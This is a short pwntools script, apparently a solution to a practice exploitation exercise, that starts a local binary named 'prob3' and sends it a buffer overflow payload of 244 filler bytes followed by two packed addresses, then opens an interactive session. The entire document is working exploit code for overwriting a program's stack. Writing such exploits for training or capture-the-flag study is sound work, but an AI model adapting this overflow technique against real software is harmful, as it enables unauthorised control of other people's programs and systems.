from pwn import *

p = process("./prob3")

p.recvuntil("your exploit : ")

payload = ("A" * 244) + p32(0x2000) + p32(0x1000)

pause()

p.sendline(payload)

p.interactive()